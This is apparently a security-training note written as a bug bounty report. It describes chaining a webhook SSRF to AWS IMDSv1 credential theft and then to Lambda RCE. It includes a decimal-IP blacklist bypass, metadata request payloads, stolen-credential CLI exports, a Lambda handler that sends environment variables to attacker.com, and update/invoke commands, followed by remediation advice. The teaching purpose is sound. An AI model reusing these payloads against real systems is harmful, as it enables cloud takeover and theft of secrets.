---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.03 Bug Bounty Report SSRF to RCE"
---

# 60.03 Bug Bounty Report: Server-Side Request Forgery (SSRF) chained to Remote Code Execution (RCE) via AWS Metadata

## 1. Executive Summary

This report details a highly critical vulnerability discovered during a bug bounty program for a cloud-native SaaS platform. The application featured a webhook integration service that allowed users to specify a URL to which the platform would send event notifications. This functionality was vulnerable to a Server-Side Request Forgery (SSRF).

While the SSRF itself allowed for internal network scanning, the true critical impact was realized by chaining the SSRF to query the AWS EC2 Instance Metadata Service (IMDS). By bypassing the platform's weak blacklists, temporary AWS IAM credentials were exfiltrated. Further enumeration revealed that the compromised IAM role possessed excessive permissions, specifically the ability to update AWS Lambda functions. This ultimately led to Remote Code Execution (RCE) within the target's AWS environment, allowing for full infrastructure compromise. 

This chain demonstrates the catastrophic risks of combining application-layer vulnerabilities with overly permissive cloud architecture.

## 2. Vulnerability Description

Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource without validating the user-supplied URL. In this case, the `webhook_url` parameter in the API accepted URLs and initiated HTTP requests from the backend servers.

The application attempted to mitigate SSRF by blacklisting standard internal IP ranges (e.g., `127.0.0.1`, `10.0.0.0/8`, `169.254.169.254`). However, this blacklist was flawed and could be bypassed using alternative IP representations (e.g., decimal IP addresses) and DNS rebinding techniques.

Once the blacklist was bypassed, the attacker could communicate with the AWS IMDS endpoint (`http://169.254.169.254/latest/meta-data/`). The EC2 instances were running IMDSv1, which does not require a specific header (like `X-aws-ec2-metadata-token` used in IMDSv2) to retrieve metadata, making extraction trivial via a simple GET request.

## 3. Scope and Target

- **Target Domain:** `hooks.target-saas.com`
- **Vulnerable Component:** Webhook Registration API (`POST /api/v1/webhooks`)
- **Cloud Environment:** Amazon Web Services (AWS)
- **Impact:** Critical (Remote Code Execution, Complete Cloud Environment Compromise)

## 4. Prerequisites

1. An authenticated account on the SaaS platform with privileges to create webhooks.
2. Knowledge of cloud metadata endpoints (specifically AWS IMDS).
3. AWS CLI installed locally for credential utilization and enumeration.

## 5. ASCII Architecture & Attack Diagram

```text
+----------------+      1. POST /api/v1/webhooks        +------------------+
|                |      {"url": "http://2852039166/"}   |                  |
|   Attacker     | -----------------------------------> |  API Gateway     |
|                |                                      |                  |
+----------------+                                      +--------+---------+
       ^                                                         |
       | 5. IAM Creds                                            | 2. Forwards payload
       |    Returned                                             v
+------+---------+      4. Returns IAM Credentials      +------------------+
|                |      (AccessKey, SecretKey, Token)   |                  |
|   AWS IAM      | <----------------------------------- |  Backend EC2     |
|   Role         |                                      |  (Vulnerable App)|
+----------------+                                      +--------+---------+
                                                                 |
                                                                 | 3. Internal HTTP GET
                                                                 |    http://169.254.169.254/
                                                                 v
                                                        +------------------+
                                                        |                  |
                                                        |  AWS EC2 IMDSv1  |
                                                        |  (Metadata Svc)  |
                                                        |                  |
                                                        +------------------+
                                                        
      (Phase 2: RCE)
      
+----------------+      6. AWS CLI aws lambda           +------------------+
|                |         update-function-code         |                  |
|   Attacker     | -----------------------------------> |  AWS Lambda      |
|  (Local CLI)   |                                      |  (Production)    |
+----------------+                                      +------------------+
```

## 6. Step-by-Step Proof of Concept (PoC)

### Step 1: Discovering the SSRF

The attacker registers a new webhook pointing to an external Burp Collaborator server to confirm the application makes outbound HTTP requests.

```http
POST /api/v1/webhooks HTTP/1.1
Host: hooks.target-saas.com
Content-Type: application/json
Authorization: Bearer <token>

{
  "event": "user.created",
  "webhook_url": "http://attacker-collaborator.com/ping"
}
```
A ping is received on the Collaborator, confirming the server acts as an HTTP client.

### Step 2: Bypassing the Blacklist

Attempts to query `http://169.254.169.254/` directly are blocked by an application error: "Invalid URL provided."
The blacklist is bypassed by converting the IP address `169.254.169.254` to its decimal representation: `2852039166`.

Payload:
```json
{
  "event": "user.created",
  "webhook_url": "http://2852039166/latest/meta-data/"
}
```
The application accepts the URL and the webhook fires. By reviewing the webhook history in the UI, the response from the server is visible, listing the metadata directories!

### Step 3: Exfiltrating IAM Credentials

The attacker navigates the metadata directory structure to extract the IAM role name and subsequently the temporary credentials.

Request 1 (Get Role Name):
```json
"webhook_url": "http://2852039166/latest/meta-data/iam/security-credentials/"
```
Response: `backend-prod-role`

Request 2 (Get Credentials):
```json
"webhook_url": "http://2852039166/latest/meta-data/iam/security-credentials/backend-prod-role"
```
Response:
```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-06-09T10:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...XYZ",
  "SecretAccessKey" : "abc123def...",
  "Token" : "IQoJb3JpZ2luX2V...",
  "Expiration" : "2026-06-09T16:00:00Z"
}
```

### Step 4: Enumerating AWS Privileges

The attacker configures their local AWS CLI with the stolen credentials:
```bash
export AWS_ACCESS_KEY_ID="ASIA...XYZ"
export AWS_SECRET_ACCESS_KEY="abc123def..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2V..."
```

Using the `aws sts get-caller-identity` command confirms the identity.
Next, enumeration tools like `pacu` or manual CLI commands are used to check permissions. It is discovered that the role has `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` permissions.

### Step 5: Achieving Remote Code Execution (RCE)

The attacker writes a malicious Python script (`malicious.py`) designed to spawn a reverse shell or exfiltrate environment variables containing database passwords.

```python
import os
import socket
import subprocess

def lambda_handler(event, context):
    # Exfiltrate environment variables to attacker server
    import urllib.request
    import json
    data = json.dumps(dict(os.environ)).encode('utf-8')
    req = urllib.request.Request("http://attacker.com/exfil", data=data)
    urllib.request.urlopen(req)
    return {"statusCode": 200, "body": "Success"}
```

The script is zipped: `zip payload.zip malicious.py`

The attacker updates an existing, less-critical Lambda function (e.g., `image-thumbnail-generator`) with the malicious code:

```bash
aws lambda update-function-code \
    --function-name image-thumbnail-generator \
    --zip-file fileb://payload.zip \
    --region us-east-1
```

Finally, the attacker invokes the Lambda function:
```bash
aws lambda invoke \
    --function-name image-thumbnail-generator \
    --invocation-type RequestResponse \
    output.txt \
    --region us-east-1
```

The attacker's server receives the environment variables, achieving full Remote Code Execution within the AWS environment.

## 7. Deep Dive: Why did this happen?

The root cause is a failure at two distinct layers of the technology stack:
1.  **Application Layer:** Implementing custom IP blacklists is a notoriously fragile approach to SSRF protection. Attackers have dozens of bypass techniques (octal, decimal, IPv6, DNS rebinding, 302 redirects).
2.  **Infrastructure Layer:** 
    *   **IMDSv1 vs IMDSv2:** AWS introduced IMDSv2 specifically to mitigate SSRF by requiring a `PUT` request to obtain a token before retrieving metadata. The target was still running the legacy IMDSv1.
    *   **Principle of Least Privilege:** The IAM role attached to the EC2 instance possessed permissions far beyond what a backend web server requires. An EC2 instance handling webhooks does not need the ability to update Lambda function code.

## 8. Impact Assessment

The impact of this exploit chain is total system compromise.
- **Confidentiality:** All secrets, databases, and customer data within the AWS environment can be accessed.
- **Integrity:** Production code running in Lambda functions can be arbitrarily modified.
- **Availability:** The attacker could delete resources, resulting in a complete Denial of Service.

## 9. Remediation and Mitigation

**1. Application Code Fix (SSRF Prevention):**
Do not rely on blacklists. Use a strict whitelist if possible. If arbitrary outbound requests are required by business logic, execute them in a sandboxed, isolated network environment (like an egress-only VPC) with no access to internal IP ranges or cloud metadata endpoints.

**2. Infrastructure Fix (Enforce IMDSv2):**
Mandate the use of IMDSv2 on all EC2 instances. This requires the application to fetch a token via a PUT request with a specific header, which cannot be forged via a standard GET-based SSRF.
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled
```

**3. Infrastructure Fix (IAM Least Privilege):**
Audit and restrict the IAM role attached to the EC2 instance. Remove wildcards (`*`) from IAM policies and ensure the role only has permissions absolutely necessary for its function.

## 10. Chaining Opportunities

- **[[04 - Bug Bounty Report Subdomain Takeover]]:** Once AWS credentials are stolen, the attacker can inspect Route53 configurations to find dangling DNS records and execute subdomain takeovers.
- **[[01 - Bug Bounty Report Critical SQLi]]:** Extracted environment variables often contain direct database connection strings, bypassing the need for web-layer SQLi.

## 11. Related Notes

- [[02 - Bug Bounty Report Account Takeover Chain]] - Another complex chain.
- [[31 - API Security]] - Securing API webhook endpoints.
- [[48 - Cloud Security and AWS IAM Misconfigurations]] - Detailed guide on AWS exploitation.

```
